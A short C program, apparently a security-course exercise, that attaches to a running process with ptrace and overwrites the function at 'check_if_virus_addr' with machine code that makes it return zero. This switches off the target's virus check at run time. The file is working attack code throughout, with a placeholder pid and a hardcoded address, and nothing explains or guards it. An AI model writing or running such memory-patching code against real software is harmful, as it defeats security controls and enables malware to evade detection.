#include <assert.h>
#include <stdint.h>
#include <stdio.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>


int pid = 0x12345678;


int main() {
	if (ptrace(PTRACE_ATTACH,pid,NULL,NULL) == -1){
		perror("attach");
		return 1;
	}
	int status;
	waitpid(pid,&status,0);
	if (WIFEXITED(status)) {
		return 1;
	}
	long check_if_virus_addr = 0xb7fd3750;
	long check_if_virus_addr_2 = check_if_virus_addr + 4;
	long command1 = 0x000000b8;
	long command2 = 0x9090c300;
	if (ptrace(PTRACE_POKEDATA,pid,check_if_virus_addr,command1) == -1) {
		perror("poke data");
		return 1;
	}
	if (ptrace(PTRACE_POKEDATA,pid,check_if_virus_addr_2,command2) == -1) {
		perror("poke data");
		return 1;
	}
	if (ptrace(PTRACE_DETACH,pid,NULL,NULL) == -1)  {
		perror("attach");
		return 1;
	}
}
